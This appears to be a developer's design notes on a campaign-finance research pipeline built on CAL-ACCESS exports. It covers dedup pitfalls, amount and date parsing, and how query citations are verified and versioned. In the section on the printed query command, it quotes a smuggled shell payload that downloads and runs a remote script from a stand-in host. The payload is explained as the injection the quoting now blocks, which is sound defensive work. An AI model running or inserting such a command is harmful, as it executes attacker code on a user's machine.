- `session` and `sess`, so a web session sent under either name gets through;
- `keys`;
- `ticket`, a citation number in public records, while a single-sign-on ticket is spent by
  the time the browser shows the page;
- `sign`.

The false positives are accepted: `sort_key`, `pageToken`, and a legislature that numbers its
sessions as `SessionID`. Each costs a hand-recorded entry, while the opposite mistake publishes
a credential. No list of names is complete, so a credential under a name nobody listed still
gets through. Add a name when one is found, and check it against public-records usage first.

A message repeats a flagged name only if it reads like one a person wrote. A value can land in
a name slot, such as a JSON map keyed by session id. A mixed-case token splits into a run of
short words, and a hex id is one long word, so both are described instead of repeated.

The habit worth keeping: when a source looks browser-only, open dev tools and see what the
UI is calling. The FPPC portal is JS; its data is a cookieless JSON POST.

## Don't proxy the property you actually care about

`snippet_too_short` counted words, as a stand-in for "distinctive". It rejected a parcel
number such as `000-111-222-000` — unique on the page, exactly what a human would ⌘F — and the
retry came back with a span crossing a line break, which our extracted text matches and a human's
find bar does not. The rule pushed researchers toward the failure it existed to prevent.

Uniqueness is checked against the real page and measures distinctiveness directly, so the
length floor only needs to exclude bare common words: short is fine if it is a real
identifier. Line-breaking spans are now rejected outright, since that is a genuine
Cmd-F failure our own matcher cannot see.

## SUM() over no rows is 0.0, and a zero is a publishable sentence

The worst bug this project has produced: `ie_total` asked for expenditures opposing a candidate
and returned **$0.00, marked found** — because the committee that had spent six figures against
them filed with the whole name in the last-name field, so a (last, first) filter matched
nothing. "No committee has spent against this candidate" is a sentence a voter guide would
print.

So: **every query returns `found=False` on no rows**, never a zero, and the note lists
near-matches. `_no_rows()` exists for exactly this and every new query must use it.

Related traps in the same data:
- **A blank amount is not zero.** `CAST('' AS REAL)` is 0.0 and `COUNT(*)` still counts the
  row, so a total whose only row had a blank `AMOUNT` came back found, "$0.00, 1
  expenditure(s)" or "1 itemized gift(s)". A blank is money nobody
  stated: leave it out of the sum *and* the count, and name it in the detail. Test for "is a
  number", not "is empty": CAST also reads `N/A` as 0.0 and `1,000` as 1.0. A stated `0` is
  the filer's figure and counts. `amount_sql()` is that test, and every query reads `AMOUNT`
  through it: `ie_total` and the three receipt queries, from their v2, and the receipt queries'
  late-report check. A total sums the stated amounts and names what it left out. A rank cannot,
  because a gift of unknown size could make anyone largest: while any gift on the schedule it
  ranks has no amount, `top_contributor` names no largest contributor, only the stated leader
  as a lead to check. `vg calaccess contributions`
  reads amounts the same way. It prints a blank as `blank` and any other unreadable amount as
  filed, and it gives such gifts their own `--top` slots after the ranked ones, since those
  are the gifts a total names as not counted. The IE listing prints a blank as `blank` but
  still reads other amounts with Python's `float()` (#56).
- **A dedup reads a value the way the sum does.** `DEDUPED_RECEIPTS` grouped on
  `CAST(AMOUNT AS REAL)`, which reads `300,000` as 300.0. A row filed that way merged into a
  $300 gift under the same transaction base, `MAX()` over the text kept `300,000`, and once
  that read as unknown, the stated $300 went with it. It groups on `amount_sql()` now. When
  you change how a value is read, find every place that groups or compares on it too.
- **Names are not reliably split.** Match `NAML`, `first || ' ' || last`, and
  `last || ' ' || first`. But with a first name given, do NOT also match a bare surname: a
  race can have two candidates who share one, and a bare surname match belongs to neither.
- **Dates are `M/D/YYYY 12:00:00 AM` text.** A string comparison sorts 5/24/2026 before
  10/14/2014. Normalize in SQL with `iso_date_sql()`, and filter before `LIMIT`, never after
  it in Python. Without a date window, a candidate's old legislative race and current statewide
  race sum into a figure that answers neither — one real unfiltered "support" total was mostly
  money from a race twenty years earlier. Test fixtures use the real format: ISO fixture
  dates once hid a `--since` that dropped 10/14/2025 and kept 3/1/2010.
  Compare a bound at **its own precision**, never cut to a common one: `ie_total` cut both
  bounds to `YYYY-MM`, so `until=2025` excluded all of 2025 (`'2025-06' > '2025'`) and a
  day widened to its month. And refuse a bound that is not a real ISO date: `10/14/2025`
  compares as text, `２０２５` passes `\d` and sorts after every ASCII date, `2025-00` ends
  the window in 2024 — and each returns a total that still matches its recorded `expected`.
  `date_window_sql()` does both; every windowed query goes through it. A row whose date is
  not a real one (`real_date_sql()` — shape is not enough: day-first `14/10/2025` normalizes
  to `2025-14-10`) is the caller's call, and the result must say which it made.

## Verification is re-running the check, not always ⌘F

⌘F is the right verification for prose. It is the wrong one for structured data: a
contribution total is not a string on any page, and insisting it must be one is what pushed
researchers onto third-party mirrors whose numbers we then had to trust.

So a source may carry a **query citation** instead of relying on its snippet: a registered
query name, its parameters, and the value claimed. `verify_query_source()` re-runs it and
compares, the review app prints the command, and the reviewer checks the number by running it.
For structured data this is *stronger* than a snippet — reproducible on demand, with no page
that can change between the run and the review.

The constraints that make it trustworthy:
- **Queries are named and parameterized; agents never write SQL.** An agent that can write
  arbitrary SQL can write one that returns whatever its claim needs — the same
  self-certification problem `verification` has elsewhere.
- **A miss is never a zero.** A donor name that is close but not exact used to return `0.0`,
  which reads as "this donor gave nothing": a false finding wearing a verified badge. A miss
  returns `None` plus near-matches, and fails verification.
- **Exact means to the cent.** `matches()` allows half a cent absolute for dollar figures and
  nothing for integer counts. It used to allow 0.5% relative, which verified a round figure
  against a true total about $2,000 away. Not "within a cent", either: 100.02 − 100.01 is
  0.00999… in binary floats.
- **The printed command is agent-authored text handed to a human's shell.** `human_command()`
  `shlex.quote`s the name, every key and every value. It once quoted only values containing a
  space, so `$(curl${IFS}-s${IFS}evil.sh|sh)` went through bare. Quoting cannot fix a control
  character (it acts on the terminal first), a name starting with `-` (an option to `vg
  query`), a key containing `=`, or invisible text. `QueryCitation` refuses those at load
  (`queries.unsafe_reason`), `run()` refuses them again, and `human_command()` prints nothing
  for them. That has a measured cost: 84 of ~1.2M distinct contributor names in the export
  carry control bytes (mostly double-encoded accents), so those donors are cited by filing
  page, not by query. The quoting is POSIX (sh, bash, zsh); fish reads `\'` differently.
  Test the output in a real `sh`, not only `shlex.split`: shlex expands nothing, so it
  round-trips an unquoted `$(...)` as one tidy argument.

## A collapsed row must still name its provenance

Deduping is not free: when several rows become one, the group has to keep whatever the reader
needs to leave the table. I collapsed restatements and dropped `FILING_ID`, so every listed
contribution printed `filingid=&amendid=0` — a dead link, under a footer instructing the
reader to cite the filing page. The finding aid lost its exit to a citation, which quietly
turns every figure taken from it back into an uncitable number, and it looks like the
researcher's mistake rather than the tool's.

So a collapsed group carries the EARLIEST filing in the chain (where the gift was first
reported) plus a count of how many filings restated it. Anywhere else a dedup lands, ask what
the row still has to be able to point at.

This one also failed *silently*, which is the distinction worth keeping: `vg check-claim`
caught a stale expected value the same night by refusing with an explanation, and that saved a
wrong citation twice. An empty field fails quietly and reads as data.

## A database row is a finding aid, not a citation

Campaign finance only works through the CAL-ACCESS nightly bulk export: `powersearch` drops
non-browser connections and `cal-access` is behind bot protection (which we do not attempt to
defeat — the export is public and carries the same data).

The trap is that the export makes it *easy* to state a number nobody can check. A row in a
local TSV has no URL to open and no text to ⌘F, so a claim resting on one is unverifiable by
construction — the same defect as a fabricated quote, arrived at honestly. Every query
result therefore carries `filing_url()`, and the rule is: use the database to find *which
filing* says a thing, cite the filing's own page with a snippet from it.

Downloading is deliberate and manual (~1.5 GB); the pipeline never fetches it implicitly.
Tests run against a miniature synthetic export, including the stray quotes and short rows the
real TSVs contain — a dropped row there is a missing donation.

## CAL-ACCESS double-counts four ways, and all are silent

A single contribution is counted more than once by four independent mechanisms, each of which
produces a plausible number:

1. **Amendments.** Every amendment of a filing restates its transactions — *all* of them, so
   "latest" means the latest amendment **of the filing**, not of each transaction. Keyed per
   `(FILING_ID, TRAN_ID)`, a transaction the amendment dropped or re-keyed survived from the
   older one: 387,606 receipt rows across 4,722 filings. → `RCPT_LATEST` / `EXPN_LATEST` /
   `S496_LATEST`, keyed per `FILING_ID` within each table (see below for why not the cover).
2. **Filing sequences.** `FILER_FILINGS_CD` has one row per sequence, so joining to it
   multiplies again. → join `FILER_FILING` instead.
3. **Cover records.** `CVR_CAMPAIGN_DISCLOSURE_CD` carries duplicate rows for 61,088
   filings, and joining a clean fact table to a multiplying cover table still double-counts —
   the guards on `S496`/`RCPT` cannot help, because it is the JOIN that fans out. One
   candidate's support total read about 19% high. → join `CVR_LATEST`.
4. **Cross-form.** A gift over the 24-hour threshold is reported on BOTH Form 460 Schedule A
   and Form 496 Part 3 — genuinely different filings, so (1) and (2) miss it. One donor
   came out at exactly double its true total, and it hits large donors hardest because only
   they cross the threshold. → `DEDUPED_RECEIPTS` collapses on the TRAN_ID base shared after
   the form prefix (`A-100001` / `F496P3-100001`).

**"Latest" is the latest amendment in each fact table, not the cover's, on purpose.**
Sometimes a filing's latest amendment has a cover record and no rows in a fact table. That can
mean the amendment withdrew the rows, or that it didn't restate that schedule, and the export
can't tell which. A full rebuild found 753 such (table, filing) pairs. `S496_CD` has 183
filings ($5.66M), `RCPT_CD` 388 ($79.1M) and `EXPN_CD` 182 ($12.8M). Every table has both
kinds, and 2026 does too:
- One filing's amendment says "Remove Independent Expenditure", withdrawing a six-figure
  expenditure against a candidate.
- Another's says it updates an IE's amount, and has no rows at all.

Taking the cover's maximum would count the second kind as zero. It would also drop six figures of
receipts behind an amendment whose only stated change was a missing address. The
per-table maximum keeps the older rows instead. That overcounts the first kind (the
withdrawn expenditure still counts), and it is still wrong for the second, because it gives
the update's old amount, not the new one. Nothing loaded or loadable separates the two kinds:
- Summary totals (`SMRY_CD`) don't. One filing's summary still reports the Schedule C total its
  amendment's rows omit.
- E-filing headers (`HDR_CD`) don't: every one of the 753 has one.
- Filing types don't either.

So the rule keeps the rows. It never zeroes a filing's rows for want of a restatement,
while a zero from the cover rule would read as a finding. None of the known-good
figures involves such a row, and each comes out the same under either rule. When two rules fail in
opposite directions and the data can't say which case you're in, keep the one that doesn't
manufacture a zero, and flag the case. (Which candidate total a kept row reaches is a separate
question, below: the update filing's rows reach none.)

**The flag.** The rule's own error used to be silent. `calaccess.unrestated_filings()` now
finds such a filing: its highest cover `AMEND_ID` is above the highest its table has. It asks
per filing, through the `FILING_ID` indexes, and only for the filings a result touched:
- **A citable figure** that counts a row from one carries it (`QueryResult.unrestated`), with
  what that filing accounts for. `vg verify` and `vg build` send the row to `human_review`,
  naming each filing to open and its share (`QueryResult.unsettled`: the largest few, since it
  lands in the claim file; `vg query` lists every one). The skill does not retry such a row,
  which would only invite a researcher to change parameters until the filing drops out. The
  value is compared
  as before, so a mismatch is still `snippet_not_found`, and the flag never changes a number.
  A note alone would still render green.
- **What counts as counted** differs by query. `ie_total` asks only about the rows its window
  and amount rules sum, and the receipt queries only about gifts with a readable amount
  (`amount_sql()`): one without is in no total, so its filing has no share. A deduplicated gift is flagged when *any* filing it came from is
  unrestated, even when another filing in its group is settled: which report of the gift
  stands is the same open question. The filing named is the unrestated one, not the earliest
  filing the listing cites. `top_contributor` is flagged by *any* such gift to the filer. The
  ranking is made of all of them, and an update can raise a figure as well as withdraw one.
- **The listings** mark the row (`unrestated`, the "latest amendment" column) and keep
  listing it: a finding aid that hid the row would hide the filing to open.
- **A filing with no cover at all** has nothing to compare, so it is not flagged.
- **A database without cover amendment ids** cannot check at all. Every citable query refuses
  it (`connect_citable()`, below), and the listings say they cannot check. So does one with no
  cover table, with its own message, since a rebuild from the same zip would not help.
- **Each query computes the flag itself**, so `test_every_citable_query_flags_and_refuses`
  holds every registered CAL-ACCESS query to both the flag and the refusal. A new query fails
  it until it has them.

**The same ambiguity recurs inside a table, and there the rule leaves rows out.** `RCPT_CD` and
`EXPN_CD` each hold several schedules, told apart by `FORM_TYPE` (A, C, I and F496P3 among
receipts). The per-table maximum takes a filing's latest amendment in the table whole. So when
that amendment has rows on schedule C and none on schedule A, the earlier amendment's schedule
A rows count nowhere, and the per-table flag sees nothing, since the table's maximum is the
cover's. Measured against a full export, the case is real: a small share of the receipt
filings with more than one amendment, mostly from before 2021, with some in the current cycle.
A figure drawn from one undercounted silently and rendered green.

Taking each schedule's own latest amendment would trade that undercount for an overcount
wherever the amendment really did withdraw the schedule. So the rule stays, and this case is
flagged too, as the mirror image of the one above:
- `calaccess.unrestated_schedules()` finds such a schedule. It asks per filing, through the
  `FILING_ID` indexes: first which filings have more than one amendment in the table, from the
  index alone, then the schedules of only those.
- **A citable receipts figure** that would have counted rows from one carries it
  (`QueryResult.omitted`), with what it leaves out, and goes to `human_review` through the same
  `unsettled` reason. That reason says it "leaves out rows a later amendment may have
  withdrawn", and the skill matches the phrase both reasons share, so it doesn't retry either.
- **A miss carries it too.** When every match with a readable amount is on a left-out
  schedule, the query finds nothing counted, and "NO MATCH for that name" would tell a
  researcher the donor gave nothing. The note says every such match was left out instead, and
  `vg query` names the filings. Such a citation goes to `human_review`, not
  `snippet_not_found`: a retry of its parameters cannot reproduce it and would only invite a
  mirror, and the reason names the claimed figure, which nothing here checked. The note still
  names another `form_type` that counts the gift: that is a different figure, for the claim to
  choose. `top_contributor` can miss this way too, since it ranks schedule A by default; not
  while a gift has no amount, which names no largest contributor whatever the left-out rows
  hold.
- **The late-report gate's own miss carries no left-out flag.** With `form_type` unset, a
  figure a pending late gift could change is a miss that still counts gifts, so the flag's note
  ("every match … left out") would be false; `form_type=A` returns the figure with both flags.
  And a Form 496 whose schedule-A copy is on a left-out schedule reads as pending unless a 460
  period covers its date, since `_pending_late()` looks for the copy among counted rows. The
  gate then refuses: toward a person, never toward green.
- **What counts as left out** is decided by the figure's own grouping. The left-out rows are
  staged in a TEMP table and grouped with the counted ones under the figure's own filter
  (`queries.left_out_gifts()`, which the listing uses too). A gift a counted row also reports,
  such as the Form 496 copy of a Schedule A gift, is in the figure either way and is not
  flagged. Nor is a gift with no readable amount, which every figure leaves out anyway
  (`amount_sql()`), so it has no share, as in `_receipt_shares()`. `top_contributor` is
  flagged by any other left-out gift on the schedule it ranks.
- **The contributions listing now shows a left-out gift**, marked "not counted" in the "latest
  amendment" column; before, it was invisible. Counted gifts come from their own arm of the
  listing, exactly as the figures count them, so a left-out copy never changes which filing a
  counted gift cites. The listing groups every schedule, so "not counted" means no figure
  counts the gift. A figure on one schedule can still leave out a gift the listing shows
  unmarked: when its only schedule-A copy is left out and a Form 496 copy counts it, the
  schedule-A figure's own reason names the filing, and its note names the `form_type` that
  counts the gift.
- **`ie_total` has nothing to check**: `S496_CD` holds a single schedule.
  `test_every_citable_query_is_checked_for_left_out_schedules` holds every citable query to
  the check or to that exemption, so a new one fails it until it is classified.
- **The build loads `EXPN_CD.FORM_TYPE`**, so the check can run on expenditures too. Nothing
  reads `EXPN_CD` yet: a query or listing that does must call `unrestated_schedules()` on it,
  as the receipt queries do. A database built before that needs `uv run vg calaccess build`,
  and until then `unrestated_schedules()` refuses the table (`DegradedDatabase`) rather than
  read it as settled.

**Whose money a kept row is has the same ambiguity, and the latest cover still decides it.**
Form 496 rows join `CVR_LATEST`, the filing's latest cover. (Receipts reach their filer
through `FILER_FILING` and never join a cover.) When the latest cover comes from a later
amendment with no rows, it can name a different candidate or stance. That happens for 24 Form
496 rows ($177,165.01) in 13 filings, and the amendments' explanations are just as mixed:
- **8 are withdrawals.** For example, one says it removes a late IE report, and its later cover
  moves opposition to one candidate onto support for another.
- **1 corrects the cover**, adding the candidate the expenditure was for.
- **1 is an update**, and its later cover names no candidate, so its rows reach no candidate
  total.
- **3 are unclear:** one has no explanation, one says "N/A", and one says "AMENDMENT TO
  NON-MONETARY CONTRIBUTION".

I tried joining each row to its own amendment's cover instead, and reverted it. It lost the
corrected filing's money for the candidate its later cover added, and it turned disowned money
into findings: filings whose amendments say "filed in error" or "inappropriately filed"
credited thousands of dollars to candidates. Neither cover is right in
general. So the latest cover stays, and the case is flagged instead. Changing which evidence
decides an ambiguous case only changes who is wrong; flag it instead. A row whose own cover and
latest cover disagree always comes from a filing whose latest amendment has no rows, so any
total that counts it is flagged, and so is its listing row (the flag, above).

**The other side is flagged too.** The total the row's own cover would have reached never
counts it, and the update filing's rows reach no total at all, so for a while nothing flagged
that total: it was short by a row nobody mentioned. `ie_total` now also finds the rows its
window and amount rules would count whose own amendment's cover matches what it asks for, name
and stance, while no cover of the latest amendment does (`calaccess.left_out_sql()`). They go
in `QueryResult.reattributed`, and `unsettled` sends the total to `human_review` naming each
filing and the amount left out, in its own phrase, which the skill also does not retry. A
total with no counted rows at all is a miss that carries the flag, as a receipt query's miss on
a left-out schedule does (above): its note says the rows were not counted, never "NO MATCH",
`unsettled` names the filings, and the citation goes to `human_review`, so it never reads as
"nobody spent on this candidate". The listing shows such a row
under the candidate its own cover named. A row whose later cover only flipped the stance stays
under the latest cover, since the other stance's total counts it, and is marked all the same:
the mark names both covers, so the listing and the flag agree about which filings are open. So
it is marked only when the earlier stance is one code, which a total can ask for: a blank one
is none, every total that could count the row does, and a mark would hold open a filing no flag
does.

Two things made that check cost 0.6s rather than 5s on a synthetic export of 1.5 million
covers, and both apply to any second pass over these views:
- **Don't join `CVR_LATEST` again.** Each query that joins it rebuilds the whole view. The
  check asks per filing through the `FILING_ID` index instead, with `EXISTS`, so a second
  cover record of one amendment could never count a row twice.
- **A flattened subquery can run the cheap-looking work first.** SQLite flattened the
  window test into the correlated one and worked out every expenditure's date before the
  index lookups that keep a handful of rows: 3s. A `MATERIALIZED` CTE runs the selective
  test first. `EXPLAIN QUERY PLAN` looked the same both ways, so time it.

Test SQL through `uv run python`, not the `sqlite3` CLI: they are different SQLite builds.
Python's bundled 3.50 rejects an outer column in a subquery's `ORDER BY` ("no such column"),
and the 3.54 CLI accepts it. A cover lookup (since reverted) that ran fine in the CLI failed
21 tests. Correlate through `WHERE`, which every version accepts.

To measure a view change without touching the live database, build a scratch root **outside
any data root**, such as a temp directory. Symlink the zip into `<scratch>/cache/calaccess/`,
then run `uv run vg calaccess build --data <scratch>`. It takes about five minutes and ~6 GB.
Don't use `data/scratch`: `_cache_root()` sends a child of a directory holding `questions.json`
to its parent, so that build deletes and rebuilds the live database.

The safety test before trusting any total: check which form types the filer actually used. A
committee with no Form 496 rows cannot be hit by (4).

`AMEND_ID`, `TRAN_ID` and `LINE_ITEM` are not optional columns. I dropped them once to shrink
the database and made the data unusable while it still looked plausible.

A view fix does not reach a database that is already built: views are written in at build
time, and the real export database kept the per-transaction view after the code was fixed.
So `connect()` installs every dedup view as a TEMP view, which SQLite resolves before `main`,
and the definition in `calaccess.py` is the one every query runs. A change that only
redefines a view applies on the next connection, with no rebuild. The persisted copies are
only as current as the last build, so check a figure with `vg query`, not by hand in the
sqlite3 shell.

**A fix that needs a column the database never loaded still needs a rebuild.** I first wrote
here that this mechanism made rebuilds unnecessary. That was false for the cover layer. In a
database built before `CVR_CAMPAIGN_DISCLOSURE_CD.AMEND_ID` was loaded,
`CVR_LATEST` falls back to `DISTINCT` and keeps every amendment's cover. An amendment can
change who the filing is about: one moves from supporting one candidate to supporting
another, and 597 Form 496 filings carry more than one cover. Joined to all of
them, the latest amendment's expenditures count for every candidate any amendment named.
That put six figures of other candidates' money into one candidate's all-years support.
`connect()` raises `DegradedDatabaseWarning` whenever it has to fall
back. Every citable query goes further: it refuses (`DegradedDatabase`, through
`connect_citable()`), because a warning printed once to stderr still let a total re-run
and render green. `ie_total` refused first, for the attribution above. The receipt queries
refuse too: they never join a cover, but without cover amendment ids nothing can find the rows
a filing's latest amendment dropped (the flag, above). Until the rebuild, every query citation
reads as not reproduced. The listings are finding aids, and keep working under the warning.
The fix is an operator step, `uv run vg calaccess build`, which rebuilds from the downloaded
zip.

The same mistake reached a test: a fixture modelled a filing "as filed" from its Form 496 rows
alone and gave it the wrong cover, so the test asserted the misattribution. In Form 496
data, who the money is for lives on the cover. Before calling a fixture "as filed", read
every amendment's cover as well.

Worth remembering how the first two were caught: the deduped totals matched what a researcher
had independently reported from a third-party mirror. The mirror was right and the tool was
wrong — so when the pipeline and an outside source disagree, check the pipeline first.

## A query citation proves the query reproduces, not that it is right

The sharpest line to come out of running this, from the session that got caught by it: *a
query citation verifies that the query is reproducible, not that the query is correct.*
`vg verify` marked an inflated support figure green because the query did return its own
recorded `expected` — the number was wrong and the check passed.

What caught it was the judgment pass, not any mechanical check. That is the argument for
keeping a fresh verifier on query citations too, even though the mechanics look airtight.

**So a verdict on a query citation is about one definition of the query, and is versioned
like a page.** Every registered name has already returned different numbers after a fix, and
the sid (name, params, expected) does not cover the calculation: a query fixed to compute
something else that happened to return the same number kept a verdict about the old one. Each
`queries.REGISTRY` entry carries a `version`; `vg judge` stamps it on the verdict, and a verdict
under any other version — or none, i.e. recorded before versions existed — is stale and not
applied. `vg verify` lists them for re-judging.

The bump rule, beside the registry: **bump when a change can alter what the query returns
for any input the previous version accepted**, even if every recorded figure still
reproduces — dedup, name matching, what a parameter or date bound means, a newly required
parameter, refusing an input that used to return a value. Don't bump for wording, suggestions,
speed, or a new optional parameter whose default keeps the old behaviour. The recorded figures
reproducing is not the test: the verifier judged the calculation, not only its output. So
day-precision date bounds would bump `ie_total` even though the month-precision citations
reproduce exactly — re-judging those verdicts once is the cost, and it is the right one. That
change landed before versioning did, so v1 is defined over it; the next change like it bumps.
The first one did: `ie_total` v2 leaves an unreadable amount out of the count, so a window
holding only such rows is a miss where v1 returned a found `$0.00`. Every recorded figure
reproduces under v2, and its v1 verdicts are re-judged all the same. The receipt queries then
began refusing a database whose covers carry no amendment ids, which their earlier versions
answered from, so each bumped from the version it had: `contributor_total` and
`top_contributor` to v4, `filer_total` to v3. The unsettled-amendment flag every query now
carries bumped nothing: it changes no value, and verification acts on it, not the calculation.
Neither did the receipt queries' flag for a left-out schedule, nor `ie_total`'s for the rows
it leaves out, for the same reason.

A rule in a comment is one a session can skip, so it has a gate:
`test_a_query_definition_cannot_change_unnoticed` pins each query's version to a fingerprint
of its code and of everything else `queries.py` and `calaccess.py` define, and fails on any
change until the pin is updated. Updating it is the moment to decide on the bump, in a diff a
reviewer reads. It counts by **exclusion**: only what is named in `_NOT_A_DEFINITION`
(messages, listings, the export metadata, the comparison and the printed command) is left out.
The first version hashed a hand-kept list of helpers, and within a day it missed the
date-window helpers added later — a list of what a query uses goes stale exactly when someone
adds to it. A shared helper moving every fingerprint at once is deliberate: it changes every
query. It hashes code text, so a lint-only edit moves a pin too: dropping a stray `f` prefix
after pinning once committed a stale pin. Re-run the suite after any edit to either module,
however cosmetic, before committing.

What the figure was checked against is stamped too, machine-owned inside `verification`
(`query_run`): the version, the date of the CAL-ACCESS export the database was built from
(`vg calaccess build` records it), and the cache root. The review page prints all three, and
the command beside them carries `--cache`, so it reads the database the figure was verified
against rather than whatever `--data` resolves to. `vg judge` records a verdict only when the
question's claim file carries a `query_run` matching the current definition, export and root,
and the context token names that run — the verifier judged one run's context, and stamping
today's version over an older run's output would make a verdict about the old calculation read
as current. The file's run alone is not enough: it is the run on disk when judge runs, and a
re-verify while the verifier worked replaces it (see "Tie a verdict to the context it was
handed"). Otherwise it refuses and says to re-verify, and `vg judgments` lists such a row as
blocked (`run vg verify`) rather than counting it in the gate, which judging could then never
close.

That check reads a claim file, and sits on the trusted side deliberately: it can only refuse.
A forged `query_run` gets past it to exactly the stamp `vg judge` wrote before the check
existed — the registry's version and this root's export — never to anything better.

An older export is **reported, not stale**. The sid covers the claim's recorded `expected`,
not the live result, so a verdict survives a refresh either way — but the row only renders
green if the same definition still reproduces `expected` on the new export: the same number
from the same calculation, which is what the verdict was about. If the figure moved, the row
fails verification whatever its verdict, and correcting `expected` changes the sid, so the
verdict lapses (a `contradicts` holds its claim instead: "A dropped contradiction holds its
claim"). The report counts only verdicts that were applied on a row that reproduced.

And the trap that produced it, worth naming because it will recur: that session trusted a
freshly-fixed query over a human-sourced figure that disagreed, treating the disagreement as
evidence the human number was stale. It was the query that was wrong. **When a new tool and an
existing source disagree, suspect the tool** — it has been the tool every time so far.

## A query citation checks a number, not a ranking

This one bit a session repairing its own work: it carried a mirror-derived *ranking* over to
query-verified *totals* without re-deriving the order, and published one donor's figure as
"the largest single contributor" when lifetime it is a tie — and a "top" list whose tail
omitted larger donors. Every individual figure was correctly query-verified.

So: `contributor_total` can establish an amount and never a rank. Superlatives ("largest",
"top", "only") need `top_contributor` or an explicit ordered query, and completeness claims
("the top five are…") are not verifiable by per-item citations at all. A green row means the
number reproduces, not that the sentence around it is sound — which is exactly why the
judgment pass exists.

**A tie is a set, and a `LIMIT` cuts it.** `top_contributor` built its tie from `ORDER BY amt
DESC LIMIT 4`, so five givers at the contribution limit came back as a four-way tie naming
whichever four SQLite picked. Nothing ordered equal totals, the value reproduced for as long as
SQLite kept its pick, and a citation naming four of the five verified. The tie is now everyone
within half a cent of the top, however many, sorted by name as displayed and ignoring case. A
large tie is listed whole, not refused: the whole set is true and reproduces, and the detail
already says it is no single largest contributor.

Wherever a query picks "the top", select on the value, not a row count, and order equal values
by something stable. Three orders that look stable are not:
- **A bare column in a `GROUP BY`** is whichever of the group's rows SQLite reads, so a name's
  spelling (its case, a padded part) changed with the order rows were loaded in. Pick it with
  an aggregate (`MIN`) and trim it.
- **A set** iterates by hash, which changes from one process to the next. So does anything
  that inherits its order, such as a stable sort on a key where two entries are equal.
- **A float sum** of money is not exact, so two equal amounts can sort apart:
  $6,000.01 + $0.02 is 6000.030000000001, above $6,000.03. The name tie-break never ran, and a
  refusal listed the second name first. Round to the cent before sorting on an amount, as
  `matches()` compares one within half a cent.

## A receipt is not a contribution

`RCPT_CD` holds every receipt schedule, not only gifts:
- monetary contributions (Form 460 schedule A);
- in-kind items (C);
- miscellaneous receipts (I), such as a vendor's refund or a bank's interest;
- Form 401 payments and Form 496 Part 3 reports.

`filer_total` was fixed to default to schedule A after mixing schedules made a total come out
high. `contributor_total` and `top_contributor` read the same table through the same view, and
were not fixed with it. So a refund could make a business that gave nothing "the largest
contributor", and the citation reproduced green. When one query is fixed for what it reads, fix
the rest with it: search for the table or view (`DEDUPED_RECEIPTS`), not the query's name.

All three now count schedule A unless `form_type` names another schedule (`""` for all of them),
and name what they counted in their detail. When one misses on the schedule asked for but the
name or filer has receipts on others, the miss suggests `form_type=<schedule>` instead of
pointing at the name. It reads those schedules from the raw rows: the dedup's collapsed
cross-form row keeps only one of its two labels. A late contribution not yet on any schedule A
is the next section. And `vg calaccess contributions` still lists every schedule without saying
which (#67).

The schedule handling is shared helpers, not a copy in each query. `queries._schedule()` holds
the filter, its args, and the refusal of a padded `form_type` (`" "` is truthy, so it filtered to
the receipts with no schedule), and returns the label from `_schedule_label()`. `_elsewhere()`
holds the miss's note and suggestion. The label and the miss are display only, so they sit in
the fingerprint test's `_NOT_A_DEFINITION`, and rewording them moves no pin. They were copies,
and the same miss happened one level down: the refusal went into two queries, and `filer_total`
still returned `" "`'s sum as found. Fixing every query by hand only works until someone adds a
guard to one copy. A new query over the receipts calls the helpers, and
`test_every_receipt_query_is_tested_for_its_schedule_handling` fails until its tests cover it.

## A late report is a contribution schedule A can't see yet

A gift received in the weeks before an election is reported within 24 hours on a late report:
Form 497 Part 1 (`S497_CD`), or Form 496 Part 3 (`F496P3` rows in `RCPT_CD`) for a committee
making independent expenditures. It reaches schedule A only when the Form 460 covering its date
is filed. So the schedule-A default left it out, in exactly the weeks a voter guide is written:
`top_contributor` could name the wrong donor "the largest contributor", every total came out
short, and a figure recorded from the query's own output reproduced green.

The queries **flag, and never count**, a late entry that no schedule A restates yet
(`queries._pending_late`):
- **`form_type` unset:** a miss while such an entry could change the answer. For a total, that
  is any pending gift. For `top_contributor`, it is one that could reach the top or break a tie;
  a gift too small to matter is named, and the ranking stands.
- **A schedule asked for by name:** `form_type=A` gives the schedule-A figure, and `""` every
  receipt schedule (which holds Form 496 Part 3, but not Form 497; for one contributor, only
  the Form 496 Part 3 rows filed under the name the sum matches). While a pending late entry
  could change it, the value comes back with each late report attached (`QueryResult.late`:
  the filing, its amendment and form, what it holds, where to open it). `vg verify` and
  `vg build` send the row to `human_review`, naming five in the reason (any with an amount
  nobody stated first, then the most money), and `vg query` prints "Will not verify" with the
  rest. Build only ever downgrades: once a 460 restates the gifts, `vg verify` clears the hold.
  A stated $0 late entry changes nothing and holds nothing. The value is unchanged, and a mismatch is still `snippet_not_found`.
  For `top_contributor` that is only when the late gifts could change who leads, and it names
  only the reports that could; a ranking they can't move is settled and verifies. Reports are
  ordered by the money they hold either way, not their net, since a gift and its correction
  net to $0 and either could be what a 460 restates. A date window would make such a figure
  complete through a stated day (#78).

  This first shipped as a green figure with a "NOT a complete total" note, on the tie's rule:
  a tie verifies, and its detail says how not to word it. The epic's integration review caught
  that the rule doesn't carry over. A tie's detail is the whole truth about a settled figure,
  and only the sentence around it can go wrong. A figure short by a late gift is unsettled
  itself, and its note is exactly the rejected option below, reached through a parameter. So
  it goes to `human_review`, as #31's flag does for a figure counting a possibly-withdrawn
  amendment: **a note is enough only when the figure is settled; when the record itself is
  unsettled, the row goes to a person with each filing to open.** The two are one
  `QueryResult.unsettled`, through the same hooks in `vg verify`, `vg build` and `vg query`.
  A figure can be unsettled both ways, and the reason then names both, each with its own
  filings.

A late entry counts as restated when a schedule-A row carries the same transaction (the
cross-form key, `tran_base_sql()`), or when a 460 the filer has filed covers its dates, since
that 460 had to restate it. Anything uncertain leaves it pending: a date that can't be read, or
an amount that isn't a plain number (a blank, `$5,000` and `1,000` never pair with a stated
`0` or `1`, as a CAST would pair them). The key reads amounts through `amount_sql()`, as the
sums and the dedup do. It first had its own Python copy of that rule, which drifted at the
edges (it stripped tabs and non-breaking spaces that `TRIM` keeps): two readings of one value,
the trap in "A dedup reads a value the way the sum does".

A late entry is held against every contributor it could be. That is `_could_be()`: one name's
words all appear in the other's, whatever the case, punctuation or field. So "LAST, FIRST" in
one field, a bare surname, a middle initial and a short form of an organization's name all
count. This matching is wide on purpose, the reverse of the exact matching the totals use: a
false match here only makes a query refuse, and a missed one lets a short figure through.
The first version matched exact spellings only, and a "DOE, JANE" late gift became a new giver
holding just its own amount, so the ranking stood. What it still can't catch is a name spelled
*differently* (a typo). That one fails toward green.

